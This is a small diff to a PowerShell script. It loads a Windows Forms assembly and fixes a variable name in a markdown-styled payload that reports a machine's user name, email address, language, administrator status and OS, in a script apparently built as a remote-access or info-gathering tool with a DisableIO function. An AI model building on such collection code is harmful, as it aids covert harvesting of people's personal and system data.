@@ -1031,6 +1031,7 @@ Function DisableIO{
 # =============================================================== MAIN FUNCTIONS =========================================================================
 
 Function quickInfo{
+Add-Type -AssemblyName System.Windows.Forms
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
     $adminperm = "False"
 } else {
@@ -1064,7 +1065,7 @@ $script:jsonPayload = @{
 - **Current User**          : ``$env:USERNAME``
 - **Email Address**         : ``$email``
 - **Language**              : ``$systemLanguage``
-- **Administrator**         : ``$adminperms``
+- **Administrator**         : ``$adminperm``
 
 :minidisc: **OS Information** :minidisc:
 - **Current OS**            : ``$OSString``
